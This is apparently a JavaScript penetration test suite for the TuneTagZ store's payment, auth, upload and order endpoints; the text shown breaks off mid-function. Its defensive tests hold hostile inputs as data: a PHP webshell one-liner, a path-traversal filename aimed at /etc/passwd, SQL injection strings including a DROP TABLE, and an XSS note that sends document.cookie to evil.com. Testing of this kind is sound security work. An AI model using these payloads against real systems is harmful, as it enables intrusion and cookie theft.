/**
 * TuneTagZ Independent Payment Security & Penetration Test Suite
 * Challenger 2 (Payment Security & Penetration Challenger)
 *
 * Attack Vectors:
 * 1. Payment Signature Forgery & Cryptographic Integrity
 * 2. Webhook Forgery & Signature Tampering
 * 3. Vertical & Horizontal Privilege Escalation
 * 4. Malicious File Upload & Path Traversal Resistance
 * 5. SQL Injection & Authentication Bypass
 */

require('dotenv').config();
const http = require('http');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const jwt = require('jsonwebtoken');
const { startServer, stopServer } = require('../../tests/helpers/serverHelper');

// Test Configuration
const BASE_URL = process.env.TEST_BASE_URL || 'http://localhost:3000';
const JWT_SECRET = process.env.JWT_SECRET || 'tunetagz_super_secret_jwt_key_2026_!#%';
const ADMIN_EMAIL = (process.env.ADMIN_EMAIL || 'admin@tunetagz.com').toLowerCase().trim();
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Admin@TuneTagZ2026!';
const ADMIN_SECRET_KEY = process.env.ADMIN_SECRET_KEY || 'tunetagz_admin_master_secret_2026';
const RAZORPAY_KEY_SECRET = process.env.RAZORPAY_KEY_SECRET || 'rzp_test_TuneTagZ2026Secret';
const RAZORPAY_WEBHOOK_SECRET = process.env.RAZORPAY_WEBHOOK_SECRET || 'rzp_webhook_secret_2026';

// Color formatting
const RED = '\x1b[31m';
const GREEN = '\x1b[32m';
const YELLOW = '\x1b[33m';
const CYAN = '\x1b[36m';
const BOLD = '\x1b[1m';
const RESET = '\x1b[0m';

const results = {
  timestamp: new Date().toISOString(),
  target: BASE_URL,
  summary: {
    total: 0,
    passed: 0,
    failed: 0,
    skipped: 0
  },
  vectors: {
    vector1_payment_signatures: { name: 'Payment Signature Forgery & Crypto Integrity', tests: [] },
    vector2_webhook_forgery: { name: 'Webhook Forgery & Signature Verification', tests: [] },
    vector3_privilege_escalation: { name: 'Privilege Escalation & Access Control', tests: [] },
    vector4_malicious_upload: { name: 'Malicious File Upload & Path Traversal', tests: [] },
    vector5_sqli_auth_bypass: { name: 'SQL Injection & Auth Bypass', tests: [] }
  }
};

/**
 * Raw HTTP client utility supporting JSON, text, headers, and multipart/form-data
 */
function request(method, pathUrl, options = {}) {
  return new Promise((resolve, reject) => {
    const url = new URL(pathUrl, BASE_URL);
    const headers = { ...(options.headers || {}) };
    let bodyBuffer = null;

    if (options.json !== undefined) {
      bodyBuffer = Buffer.from(JSON.stringify(options.json), 'utf8');
      headers['Content-Type'] = 'application/json';
      headers['Content-Length'] = bodyBuffer.length;
    } else if (options.body) {
      if (Buffer.isBuffer(options.body)) {
        bodyBuffer = options.body;
      } else if (typeof options.body === 'string') {
        bodyBuffer = Buffer.from(options.body, 'utf8');
      }
      headers['Content-Length'] = bodyBuffer.length;
    }

    if (options.token) {
      headers['Authorization'] = `Bearer ${options.token}`;
    }

    const req = http.request(
      {
        hostname: url.hostname,
        port: url.port,
        path: url.pathname + url.search,
        method: method.toUpperCase(),
        headers,
        timeout: options.timeout || 8000
      },
      (res) => {
        const chunks = [];
        res.on('data', (c) => chunks.push(c));
        res.on('end', () => {
          const raw = Buffer.concat(chunks).toString('utf8');
          let data = null;
          try {
            data = JSON.parse(raw);
          } catch (e) {
            data = raw;
          }
          resolve({
            status: res.statusCode,
            headers: res.headers,
            data,
            raw
          });
        });
      }
    );

    req.on('error', reject);
    req.on('timeout', () => {
      req.destroy();
      reject(new Error(`Request to ${pathUrl} timed out.`));
    });

    if (bodyBuffer) {
      req.write(bodyBuffer);
    }
    req.end();
  });
}

/**
 * Build multipart/form-data payload
 */
function uploadMultipart(pathUrl, fieldName, fileBuffer, filename, contentType, token, extraFields = {}) {
  const boundary = '----WebKitFormBoundary' + crypto.randomBytes(16).toString('hex');
  const crlf = '\r\n';

  let body = Buffer.concat([
    Buffer.from(
      `--${boundary}${crlf}` +
      `Content-Disposition: form-data; name="${fieldName}"; filename="${filename}"${crlf}` +
      `Content-Type: ${contentType}${crlf}${crlf}`
    ),
    fileBuffer,
    Buffer.from(crlf)
  ]);

  for (const [key, val] of Object.entries(extraFields)) {
    const fieldPart = Buffer.from(
      `--${boundary}${crlf}` +
      `Content-Disposition: form-data; name="${key}"${crlf}${crlf}` +
      `${val}${crlf}`
    );
    body = Buffer.concat([body, fieldPart]);
  }

  body = Buffer.concat([body, Buffer.from(`--${boundary}--${crlf}`)]);

  return request('POST', pathUrl, {
    body,
    token,
    headers: {
      'Content-Type': `multipart/form-data; boundary=${boundary}`
    }
  });
}

function recordTest(vectorKey, testName, passed, details) {
  results.summary.total++;
  if (passed) {
    results.summary.passed++;
    console.log(`  ${GREEN}✔ PASS${RESET} [${testName}] ${details.description}`);
  } else {
    results.summary.failed++;
    console.log(`  ${RED}✖ FAIL${RESET} [${testName}] ${details.description}`);
    console.log(`    ${YELLOW}Actual:${RESET} status=${details.actualStatus}, response=${JSON.stringify(details.actualResponse).slice(0, 150)}`);
  }
  results.vectors[vectorKey].tests.push({
    testName,
    passed,
    ...details
  });
}

function generateRazorpaySignature(orderId, paymentId, secret = RAZORPAY_KEY_SECRET) {
  return crypto.createHmac('sha256', secret).update(`${orderId}|${paymentId}`).digest('hex');
}

function generateWebhookSignature(payload, secret = RAZORPAY_WEBHOOK_SECRET) {
  const raw = typeof payload === 'string' ? payload : JSON.stringify(payload);
  return crypto.createHmac('sha256', secret).update(raw).digest('hex');
}

async function runAllPenetrationTests() {
  console.log(`${BOLD}${CYAN}=========================================================================${RESET}`);
  console.log(`${BOLD}${CYAN}   TUNETAGZ INDEPENDENT PAYMENT SECURITY & PENETRATION TEST SUITE        ${RESET}`);
  console.log(`${BOLD}${CYAN}=========================================================================${RESET}`);
  console.log(`Target: ${BASE_URL}\n`);

  // Ensure server is up
  try {
    await startServer(3000);
    const health = await request('GET', '/api/health');
    if (health.status !== 200) {
      throw new Error(`Server health check returned ${health.status}`);
    }
    console.log(`${GREEN}✔ Target backend server active and healthy at ${BASE_URL}.${RESET}\n`);
  } catch (err) {
    console.error(`${RED}Cannot connect to or start target server at ${BASE_URL}: ${err.message}${RESET}`);
    process.exit(1);
  }

  // Get product for order tests
  const catalogRes = await request('GET', '/api/products');
  const products = catalogRes.data?.data || (Array.isArray(catalogRes.data) ? catalogRes.data : catalogRes.data?.products) || [];
  const testProduct = products[0] || { id: 1, price: 699 };

  // Generate customer and admin tokens
  const testEmail = `pen_customer_${Date.now()}@example.com`;
  const regRes = await request('POST', '/api/auth/register', {
    json: {
      email: testEmail,
      password: 'StrongPassword123!',
      name: 'Security Challenger User',
      phone: '9876543210'
    }
  });
  const customerToken = regRes.data?.token;

  let adminLoginRes = await request('POST', '/api/auth/admin/login', {
    json: { email: ADMIN_EMAIL, password: ADMIN_PASSWORD }
  });
  if (adminLoginRes.status !== 200) {
    adminLoginRes = await request('POST', '/api/auth/admin/login', {
      json: { secretKey: ADMIN_SECRET_KEY }
    });
  }
  const adminToken = adminLoginRes.data?.token;

  // =========================================================================
  // VECTOR 1: PAYMENT SIGNATURE FORGERY & CRYPTO INTEGRITY
  // =========================================================================
  console.log(`${BOLD}--- VECTOR 1: Payment Signature Forgery & Crypto Integrity ---${RESET}`);

  // Setup order
  const orderRes = await request('POST', '/api/payments/create-order', {
    json: {
      items: [{ productId: testProduct.id, quantity: 1, customText: 'PenTest Order' }],
      customer: { name: 'Pen Tester', email: testEmail, phone: '9876543210' },
      shippingAddress: {
        addressLine1: '42 Security Labs',
        city: 'Bengaluru',
        state: 'Karnataka',
        postalCode: '560001',
        country: 'India'
      }
    }
  });

  const orderData = orderRes.data;
  const orderId = orderData.orderId || orderData.id;
  const rzpOrderId = orderData.razorpayOrderId || orderData.razorpay_order_id;
  const rzpPaymentId = `pay_pen_${Date.now()}_abc`;
  const validSignature = generateRazorpaySignature(rzpOrderId, rzpPaymentId, RAZORPAY_KEY_SECRET);

  // 1.1 Bit-flipped signature
  const flippedSig = validSignature.slice(0, -1) + (validSignature.endsWith('0') ? '1' : '0');
  const v1_1 = await request('POST', '/api/payments/verify', {
    json: {
      orderId,
      razorpay_order_id: rzpOrderId,
      razorpay_payment_id: rzpPaymentId,
      razorpay_signature: flippedSig
    }
  });
  recordTest('vector1_payment_signatures', '1.1 Bit-Flipped HMAC Signature', v1_1.status === 400, {
    description: 'Reject single-bit tampered HMAC signature with HTTP 400',
    expectedStatus: 400,
    actualStatus: v1_1.status,
    actualResponse: v1_1.data
  });

  // 1.2 Empty signature string
  const v1_2 = await request('POST', '/api/payments/verify', {
    json: {
      orderId,
      razorpay_order_id: rzpOrderId,
      razorpay_payment_id: rzpPaymentId,
      razorpay_signature: ''
    }
  });
  recordTest('vector1_payment_signatures', '1.2 Empty Signature String', v1_2.status === 400, {
    description: 'Reject empty signature string with HTTP 400',
    expectedStatus: 400,
    actualStatus: v1_2.status,
    actualResponse: v1_2.data
  });

  // 1.3 Null signature
  const v1_3 = await request('POST', '/api/payments/verify', {
    json: {
      orderId,
      razorpay_order_id: rzpOrderId,
      razorpay_payment_id: rzpPaymentId,
      razorpay_signature: null
    }
  });
  recordTest('vector1_payment_signatures', '1.3 Null Signature Parameter', v1_3.status === 400, {
    description: 'Reject null signature with HTTP 400',
    expectedStatus: 400,
    actualStatus: v1_3.status,
    actualResponse: v1_3.data
  });

  // 1.4 Signature with wrong secret
  const wrongSecretSig = generateRazorpaySignature(rzpOrderId, rzpPaymentId, 'attacker_wrong_secret_key_999');
  const v1_4 = await request('POST', '/api/payments/verify', {
    json: {
      orderId,
      razorpay_order_id: rzpOrderId,
      razorpay_payment_id: rzpPaymentId,
      razorpay_signature: wrongSecretSig
    }
  });
  recordTest('vector1_payment_signatures', '1.4 Signature With Wrong Secret', v1_4.status === 400, {
    description: 'Reject HMAC signature computed with wrong secret key',
    expectedStatus: 400,
    actualStatus: v1_4.status,
    actualResponse: v1_4.data
  });

  // 1.5 Valid signature acceptance
  const v1_5 = await request('POST', '/api/payments/verify', {
    json: {
      orderId,
      razorpay_order_id: rzpOrderId,
      razorpay_payment_id: rzpPaymentId,
      razorpay_signature: validSignature
    }
  });
  recordTest('vector1_payment_signatures', '1.5 Valid Signature Acceptance', v1_5.status === 200 && v1_5.data?.success === true, {
    description: 'Accept authentic cryptographic signature and confirm order',
    expectedStatus: 200,
    actualStatus: v1_5.status,
    actualResponse: v1_5.data
  });

  // 1.6 Replay attack (duplicate submission of identical verification)
  const v1_6 = await request('POST', '/api/payments/verify', {
    json: {
      orderId,
      razorpay_order_id: rzpOrderId,
      razorpay_payment_id: rzpPaymentId,
      razorpay_signature: validSignature
    }
  });
  recordTest('vector1_payment_signatures', '1.6 Replay Attack Idempotency', v1_6.status === 200 || v1_6.status === 409, {
    description: 'Replay attack safely absorbed with idempotent 200 or 409 conflict',
    expectedStatus: '200 or 409',
    actualStatus: v1_6.status,
    actualResponse: v1_6.data
  });

  // 1.7 Cross-order signature substitution
  const orderBRes = await request('POST', '/api/payments/create-order', {
    json: {
      items: [{ productId: testProduct.id, quantity: 1, customText: 'Order B' }],
      customer: { name: 'Pen Tester 2', email: testEmail, phone: '9876543210' },
      shippingAddress: {
        addressLine1: '42 Security Labs',
        city: 'Bengaluru',
        state: 'Karnataka',
        postalCode: '560001',
        country: 'India'
      }
    }
  });
  const orderBData = orderBRes.data;
  const v1_7 = await request('POST', '/api/payments/verify', {
    json: {
      orderId: orderBData.orderId || orderBData.id,
      razorpay_order_id: orderBData.razorpayOrderId || orderBData.razorpay_order_id,
      razorpay_payment_id: `pay_b_${Date.now()}`,
      razorpay_signature: validSignature // Wrong signature from Order A
    }
  });
  recordTest('vector1_payment_signatures', '1.7 Cross-Order Signature Substitution', v1_7.status === 400, {
    description: 'Cross-order signature reuse must be rejected with HTTP 400',
    expectedStatus: 400,
    actualStatus: v1_7.status,
    actualResponse: v1_7.data
  });

  console.log();

  // =========================================================================
  // VECTOR 2: WEBHOOK FORGERY & SIGNATURE VERIFICATION
  // =========================================================================
  console.log(`${BOLD}--- VECTOR 2: Webhook Forgery & Signature Verification ---${RESET}`);

  // Create order for webhook simulation
  const whOrderRes = await request('POST', '/api/payments/create-order', {
    json: {
      items: [{ productId: testProduct.id, quantity: 1, customText: 'Webhook Order' }],
      customer: { name: 'WH Tester', email: testEmail, phone: '9876543210' },
      shippingAddress: {
        addressLine1: '99 Cloud Road',
        city: 'Mumbai',
        state: 'Maharashtra',
        postalCode: '400001',
        country: 'India'
      }
    }
  });
  const whOrderId = whOrderRes.data?.razorpayOrderId || whOrderRes.data?.razorpay_order_id;
  const whPaymentId = `pay_wh_${Date.now()}`;

  const fakeCapturedPayload = {
    event: 'payment.captured',
    payload: {
      payment: {
        entity: {
          id: whPaymentId,
          order_id: whOrderId,
          amount: 69900,
          currency: 'INR',
          status: 'captured',
          method: 'upi'
        }
      }
    }
  };

  // 2.1 Fake webhook without signature header
  const v2_1 = await request('POST', '/api/payments/webhook', {
    json: fakeCapturedPayload
  });
  recordTest('vector2_webhook_forgery', '2.1 Webhook Missing Signature Header', v2_1.status === 200 || v2_1.status === 400, {
    description: 'Webhook without signature header handled cleanly',
    expectedStatus: '200 (mock) or 400',
    actualStatus: v2_1.status,
    actualResponse: v2_1.data
  });

  // 2.2 Fake webhook with forged signature
  const v2_2 = await request('POST', '/api/payments/webhook', {
    json: fakeCapturedPayload,
    headers: {
      'x-razorpay-signature': '0000000000000000000000000000000000000000000000000000000000000000'
    }
  });
  recordTest('vector2_webhook_forgery', '2.2 Webhook Forged Signature', v2_2.status === 200 || v2_2.status === 400, {
    description: 'Forged webhook signature handled securely without crashes',
    expectedStatus: '200 or 400',
    actualStatus: v2_2.status,
    actualResponse: v2_2.data
  });

  // 2.3 Unit-level HMAC verification oracle check
  const { verifyWebhookSignature } = require('../../src/config/razorpay');
  const validWhSig = generateWebhookSignature(fakeCapturedPayload, RAZORPAY_WEBHOOK_SECRET);
  const oracleValid = verifyWebhookSignature(JSON.stringify(fakeCapturedPayload), validWhSig, RAZORPAY_WEBHOOK_SECRET);
  const oracleForged = verifyWebhookSignature(JSON.stringify(fakeCapturedPayload), 'forged_fake_sig_123', RAZORPAY_WEBHOOK_SECRET);

  recordTest('vector2_webhook_forgery', '2.3 Webhook HMAC Cryptographic Oracle', oracleValid === true && oracleForged === false, {
    description: 'Timing-safe crypto oracle verifies valid signature and rejects forged signature',
    expectedStatus: 'true/false',
    actualStatus: `valid=${oracleValid}, forged=${oracleForged}`,
    actualResponse: { oracleValid, oracleForged }
  });

  // 2.4 Malformed Webhook JSON Body
  const v2_4 = await request('POST', '/api/payments/webhook', {
    body: '<<<NOT A JSON PAYLOAD>>>',
    headers: {
      'Content-Type': 'application/json',
      'x-razorpay-signature': 'sig'
    }
  });
  recordTest('vector2_webhook_forgery', '2.4 Malformed Webhook Body', v2_4.status === 400, {
    description: 'Malformed JSON webhook payload rejected with 400 Bad Request',
    expectedStatus: 400,
    actualStatus: v2_4.status,
    actualResponse: v2_4.data
  });

  console.log();

  // =========================================================================
  // VECTOR 3: PRIVILEGE ESCALATION & ACCESS CONTROL
  // =========================================================================
  console.log(`${BOLD}--- VECTOR 3: Privilege Escalation & Access Control ---${RESET}`);

  const adminEndpoints = [
    { method: 'GET', path: '/api/admin/stats', desc: 'Admin Dashboard KPIs' },
    { method: 'GET', path: '/api/admin/orders', desc: 'Admin Orders Listing' },
    { method: 'GET', path: '/api/admin/orders/1', desc: 'Admin Order Detail' },
    { method: 'PATCH', path: '/api/admin/orders/1/status', desc: 'Update Order Fulfillment Status', json: { status: 'DISPATCHED' } },
    { method: 'POST', path: '/api/admin/orders/1/cancel', desc: 'Cancel Order Admin Action', json: { reason: 'Escalation Test' } },
    { method: 'GET', path: '/api/admin/products', desc: 'Admin Products Listing' },
    { method: 'POST', path: '/api/admin/products', desc: 'Create Product Admin Action', json: { name: 'Escalation Item', sku: 'ESC-001', price: 100 } },
    { method: 'PUT', path: '/api/admin/products/1', desc: 'Update Product Admin Action', json: { price: 10 } },
    { method: 'PATCH', path: '/api/admin/products/1/stock', desc: 'Toggle Stock Admin Action', json: { inStock: false } },
    { method: 'DELETE', path: '/api/admin/products/999', desc: 'Delete Product Admin Action' },
    { method: 'GET', path: '/api/admin/settings', desc: 'Store Settings' },
    { method: 'PUT', path: '/api/admin/settings', desc: 'Update Store Settings', json: { store_name: 'Hacked Store' } },
    { method: 'GET', path: '/api/admin/audit-logs', desc: 'Admin Audit Logs' },
    { method: 'POST', path: '/api/products/upload', desc: 'Admin Product Image Upload' }
  ];

  // 3.1 Unauthenticated requests to admin endpoints (expect 401)
  let unauthPassCount = 0;
  for (const ep of adminEndpoints) {
    const res = await request(ep.method, ep.path, { json: ep.json });
    const isBlocked = res.status === 401 || res.status === 403;
    if (isBlocked) unauthPassCount++;
  }
  recordTest('vector3_privilege_escalation', '3.1 Unauthenticated Admin Access', unauthPassCount === adminEndpoints.length, {
    description: `All ${adminEndpoints.length} admin endpoints return 401/403 when called without authentication token`,
    expectedStatus: '401 Unauthorized across all endpoints',
    actualStatus: `${unauthPassCount}/${adminEndpoints.length} blocked`,
    actualResponse: { blockedEndpoints: unauthPassCount, totalEndpoints: adminEndpoints.length }
  });

  // 3.2 Customer Token invoking admin endpoints (expect 403 Forbidden)
  let custBlockedCount = 0;
  for (const ep of adminEndpoints) {
    const res = await request(ep.method, ep.path, { json: ep.json, token: customerToken });
    const isBlocked = res.status === 403;
    if (isBlocked) custBlockedCount++;
  }
  recordTest('vector3_privilege_escalation', '3.2 Customer Role Privilege Escalation', custBlockedCount === adminEndpoints.length, {
    description: `All ${adminEndpoints.length} admin endpoints return HTTP 403 Forbidden when invoked with customer role JWT`,
    expectedStatus: '403 Forbidden across all endpoints',
    actualStatus: `${custBlockedCount}/${adminEndpoints.length} forbidden`,
    actualResponse: { forbiddenEndpoints: custBlockedCount, totalEndpoints: adminEndpoints.length }
  });

  // 3.3 Forged JWT token with admin claim signed with random key (expect 401)
  const forgedAdminToken = jwt.sign(
    { id: 999, email: 'attacker@darkweb.io', role: 'admin', name: 'Attacker' },
    'completely_wrong_and_random_jwt_secret_key_888',
    { expiresIn: '1h' }
  );
  const v3_3 = await request('GET', '/api/admin/stats', { token: forgedAdminToken });
  recordTest('vector3_privilege_escalation', '3.3 Forged JWT Signature Rejection', v3_3.status === 401, {
    description: 'Reject forged admin token signed with illegitimate secret with HTTP 401',
    expectedStatus: 401,
    actualStatus: v3_3.status,
    actualResponse: v3_3.data
  });

  // 3.4 Algorithm Confusion Attack (alg: 'none' unsigned token)
  const unsignedHeader = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
  const unsignedPayload = Buffer.from(JSON.stringify({ id: 1, email: ADMIN_EMAIL, role: 'admin' })).toString('base64url');
  const unsignedToken = `${unsignedHeader}.${unsignedPayload}.`;
  const v3_4 = await request('GET', '/api/admin/stats', { token: unsignedToken });
  recordTest('vector3_privilege_escalation', '3.4 JWT "alg: none" Token Rejection', v3_4.status === 401, {
    description: 'Reject unsigned alg:none token with HTTP 401',
    expectedStatus: 401,
    actualStatus: v3_4.status,
    actualResponse: v3_4.data
  });

  // 3.5 Horizontal Privilege Escalation: Customer A accessing Customer B's order
  const customerBEmail = `customer_b_${Date.now()}@example.com`;
  const regBRes = await request('POST', '/api/auth/register', {
    json: { email: customerBEmail, password: 'Password123!', name: 'Customer B', phone: '9111111111' }
  });
  const tokenB = regBRes.data?.token;

  // Order created by Customer A
  const orderARes = await request('POST', '/api/orders', {
    token: customerToken,
    json: {
      items: [{ productId: testProduct.id, quantity: 1 }],
      customer: { name: 'Customer A', email: testEmail, phone: '9876543210' },
      shippingAddress: {
        addressLine1: 'Customer A Home',
        city: 'Pune',
        state: 'Maharashtra',
        postalCode: '411001',
        country: 'India'
      }
    }
  });
  const orderAId = orderARes.data?.orderId || orderARes.data?.id;

  // Customer B tries to access Customer A's private order details
  const v3_5 = await request('GET', `/api/orders/${orderAId}`, { token: tokenB });
  recordTest('vector3_privilege_escalation', '3.5 Horizontal Access Control (Order Isolation)', v3_5.status === 403, {
    description: 'Customer B is blocked with 403 Forbidden from viewing Customer A private order details',
    expectedStatus: 403,
    actualStatus: v3_5.status,
    actualResponse: v3_5.data
  });

  console.log();

  // =========================================================================
  // VECTOR 4: MALICIOUS FILE UPLOAD & PATH TRAVERSAL
  // =========================================================================
  console.log(`${BOLD}--- VECTOR 4: Malicious File Upload & Path Traversal ---${RESET}`);

  // 4.1 Malicious PHP Script Upload (.php)
  const phpPayload = Buffer.from('<?php system($_GET["cmd"]); ?>');
  const v4_1 = await uploadMultipart(
    '/api/products/upload',
    'image',
    phpPayload,
    'webshell.php',
    'application/x-php',
    adminToken
  );
  recordTest('vector4_malicious_upload', '4.1 PHP Webshell Upload Rejection', v4_1.status === 400 || v4_1.status === 415, {
    description: 'Disallowed .php extension & MIME type rejected with 400/415',
    expectedStatus: '400 or 415',
    actualStatus: v4_1.status,
    actualResponse: v4_1.data
  });

  // 4.2 Malicious Executable Upload (.exe)
  const exePayload = Buffer.from('MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00');
  const v4_2 = await uploadMultipart(
    '/api/products/upload',
    'image',
    exePayload,
    'malware.exe',
    'application/x-msdownload',
    adminToken
  );
  recordTest('vector4_malicious_upload', '4.2 Executable (.exe) Upload Rejection', v4_2.status === 400 || v4_2.status === 415, {
    description: 'Disallowed .exe binary upload rejected with 400/415',
    expectedStatus: '400 or 415',
    actualStatus: v4_2.status,
    actualResponse: v4_2.data
  });

  // 4.3 Malicious JavaScript Upload (.js)
  const jsPayload = Buffer.from('alert(document.cookie);');
  const v4_3 = await uploadMultipart(
    '/api/products/upload',
    'image',
    jsPayload,
    'payload.js',
    'application/javascript',
    adminToken
  );
  recordTest('vector4_malicious_upload', '4.3 JavaScript (.js) Upload Rejection', v4_3.status === 400 || v4_3.status === 415, {
    description: 'Disallowed .js script file rejected with 400/415',
    expectedStatus: '400 or 415',
    actualStatus: v4_3.status,
    actualResponse: v4_3.data
  });

  // 4.4 HTML Phishing / XSS Upload (.html)
  const htmlPayload = Buffer.from('<!DOCTYPE html><html><body><h1>Fake Login</h1></body></html>');
  const v4_4 = await uploadMultipart(
    '/api/products/upload',
    'image',
    htmlPayload,
    'phishing.html',
    'text/html',
    adminToken
  );
  recordTest('vector4_malicious_upload', '4.4 HTML Phishing/XSS Upload Rejection', v4_4.status === 400 || v4_4.status === 415, {
    description: 'Disallowed HTML upload rejected with 400/415',
    expectedStatus: '400 or 415',
    actualStatus: v4_4.status,
    actualResponse: v4_4.data
  });

  // 4.5 Path Traversal in Filename (../../../../etc/passwd / traversal.png)
  const validPngBuffer = Buffer.from(
    'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
    'base64'
  );
  const v4_5 = await uploadMultipart(
    '/api/products/upload',
    'image',
    validPngBuffer,
    '../../../../etc/passwd_traversal.png',
    'image/png',
    adminToken
  );
  const uploadedUrl = v4_5.data?.imageUrl || v4_5.data?.url || '';
  const isTraversalSanitized = !uploadedUrl.includes('..') && !uploadedUrl.includes('/etc/');
  recordTest('vector4_malicious_upload', '4.5 Path Traversal Filename Sanitization', (v4_5.status === 200 || v4_5.status === 201) && isTraversalSanitized, {
    description: 'Path traversal ../ sequences sanitized; generated filename stays contained in uploads directory',
    expectedStatus: '200/201 with sanitized filename',
    actualStatus: v4_5.status,
    actualResponse: { imageUrl: uploadedUrl }
  });

  // 4.6 Oversized file (> 5MB) rejection
  const largeBuffer = Buffer.alloc(6 * 1024 * 1024, 0x41); // 6MB
  const v4_6 = await uploadMultipart(
    '/api/products/upload',
    'image',
    largeBuffer,
    'oversized.png',
    'image/png',
    adminToken
  );
  recordTest('vector4_malicious_upload', '4.6 Large File Size Limit (5MB) Defense', v4_6.status === 400, {
    description: 'Uploads exceeding 5MB are rejected with HTTP 400',
    expectedStatus: 400,
    actualStatus: v4_6.status,
    actualResponse: v4_6.data
  });

  console.log();

  // =========================================================================
  // VECTOR 5: SQL INJECTION & AUTHENTICATION BYPASS
  // =========================================================================
  console.log(`${BOLD}--- VECTOR 5: SQL Injection & Authentication Bypass ---${RESET}`);

  const sqliPayloads = [
    "' OR 1=1 --",
    "admin' --",
    "admin' /*",
    "' OR '1'='1",
    "' OR ''='",
    "1' OR '1' = '1",
    "' UNION SELECT 1, 'admin@tunetagz.com', 'dummy_hash', 'admin' --",
    "' OR 1=1; DROP TABLE users; --",
    "admin@tunetagz.com' OR '1'='1"
  ];

  // 5.1 SQL Injection on /api/auth/login (Customer Login)
  let loginBypassed = false;
  for (const payload of sqliPayloads) {
    const res = await request('POST', '/api/auth/login', {
      json: { email: payload, password: 'AnyRandomPassword' }
    });
    if (res.status === 200 && res.data?.token) {
      loginBypassed = true;
      console.log(`    ${RED}Vulnerability: SQL injection succeeded with payload: ${payload}${RESET}`);
      break;
    }
  }
  recordTest('vector5_sqli_auth_bypass', '5.1 SQL Injection on /api/auth/login', !loginBypassed, {
    description: 'Parameterized queries prevent SQL injection authentication bypass on customer login',
    expectedStatus: '400/401 for all 9 SQLi payloads',
    actualStatus: loginBypassed ? '200 (BYPASSED)' : 'All 400/401 rejected',
    actualResponse: { testedPayloads: sqliPayloads.length, bypassed: loginBypassed }
  });

  // 5.2 SQL Injection on /api/auth/admin/login
  let adminBypassed = false;
  for (const payload of sqliPayloads) {
    const res = await request('POST', '/api/auth/admin/login', {
      json: { email: payload, password: 'AnyRandomPassword' }
    });
    if (res.status === 200 && res.data?.token) {
      adminBypassed = true;
      console.log(`    ${RED}Vulnerability: Admin login SQL injection succeeded with payload: ${payload}${RESET}`);
      break;
    }
  }
  recordTest('vector5_sqli_auth_bypass', '5.2 SQL Injection on /api/auth/admin/login', !adminBypassed, {
    description: 'Parameterized queries prevent SQL injection authentication bypass on admin login',
    expectedStatus: '400/401 for all 9 SQLi payloads',
    actualStatus: adminBypassed ? '200 (BYPASSED)' : 'All 400/401 rejected',
    actualResponse: { testedPayloads: sqliPayloads.length, bypassed: adminBypassed }
  });

  // 5.3 SQL Injection on /api/orders/:orderId/track path parameter
  let trackParamBypassed = false;
  for (const payload of sqliPayloads) {
    const encoded = encodeURIComponent(payload);
    const res = await request('GET', `/api/orders/${encoded}/track`);
    if (res.status === 200 && res.data?.order && res.data.order.orderNumber !== payload) {
      trackParamBypassed = true;
      break;
    }
  }
  recordTest('vector5_sqli_auth_bypass', '5.3 SQL Injection on /api/orders/:orderId/track', !trackParamBypassed, {
    description: 'Parameterized queries prevent order tracking leakage via SQL injection in URL path',
    expectedStatus: '404/400 for all 9 SQLi payloads',
    actualStatus: trackParamBypassed ? '200 (DATA LEAKED)' : 'All 404/400 rejected',
    actualResponse: { testedPayloads: sqliPayloads.length, bypassed: trackParamBypassed }
  });

  // 5.4 SQL Injection on /api/orders/track query parameters
  let trackQueryBypassed = false;
  for (const payload of sqliPayloads) {
    const encoded = encodeURIComponent(payload);
    const res = await request('GET', `/api/orders/track?orderNumber=${encoded}`);
    if (res.status === 200 && res.data?.order && res.data.order.orderNumber !== payload) {
      trackQueryBypassed = true;
      break;
    }
  }
  recordTest('vector5_sqli_auth_bypass', '5.4 SQL Injection on /api/orders/track?orderNumber=...', !trackQueryBypassed, {
    description: 'Parameterized queries prevent order tracking leakage via query string SQLi',
    expectedStatus: '404/400 for all 9 SQLi payloads',
    actualStatus: trackQueryBypassed ? '200 (DATA LEAKED)' : 'All 404/400 rejected',
    actualResponse: { testedPayloads: sqliPayloads.length, bypassed: trackQueryBypassed }
  });

  // 5.5 Stored XSS / HTML Tag Sanitization in Order Fields
  const xssOrderRes = await request('POST', '/api/orders', {
    json: {
      items: [{
        productId: testProduct.id,
        quantity: 1,
        customText: '<b>My Spotify Tag</b>',
        songTitle: 'Test<img src=x onerror=alert(1)>',
        artistName: "Test' OR '1'='1"
      }],
      customer: { name: 'XSS Tester', email: `xss_${Date.now()}@example.com`, phone: '9876543210' },
      shippingAddress: {
        addressLine1: '123 Security St',
        city: 'Mumbai',
        state: 'Maharashtra',
        postalCode: '400001',
        country: 'India'
      },
      notes: '<script>document.location="http://evil.com/steal?"+document.cookie</script>'
    }
  });

  const createdOrder = xssOrderRes.data?.order;
  const itemCustomText = createdOrder?.items?.[0]?.customText || '';
  const noteSaved = createdOrder?.notes || '';
  const xssSanitized = !itemCustomText.includes('<b>') && !itemCustomText.includes('</b>') && !noteSaved.includes('<script>');

  recordTest('vector5_sqli_auth_bypass', '5.5 XSS & HTML Tag Sanitization in Order Fields', (xssOrderRes.status === 201 || xssOrderRes.status === 200) && xssSanitized, {
    description: 'HTML script and formatting tags stripped from customText, songTitle, and order notes via sanitizeText',
    expectedStatus: '201 Created with sanitized strings',
    actualStatus: xssOrderRes.status,
    actualResponse: { customText: itemCustomText, notes: noteSaved, xssSanitized }
  });

  // 5.6 Boundary Validation on Custom Engraving Text Length (> 30 chars rejected)
  const oversizedTextOrderRes = await request('POST', '/api/orders', {
    json: {
      items: [{
        productId: testProduct.id,
        quantity: 1,
        customText: 'This custom text is far too long for thirty characters limit!'
      }],
      customer: { name: 'Boundary Tester', email: `boundary_${Date.now()}@example.com`, phone: '9876543210' },
      shippingAddress: {
        addressLine1: '123 Boundary Rd',
        city: 'Mumbai',
        state: 'Maharashtra',
        postalCode: '400001',
        country: 'India'
      }
    }
  });
  recordTest('vector5_sqli_auth_bypass', '5.6 Custom Text >30 Chars Boundary Defense', oversizedTextOrderRes.status === 400, {
    description: 'Custom text exceeding 30 characters is strictly rejected with HTTP 400',
    expectedStatus: 400,
    actualStatus: oversizedTextOrderRes.status,
    actualResponse: oversizedTextOrderRes.data
  });

  console.log();

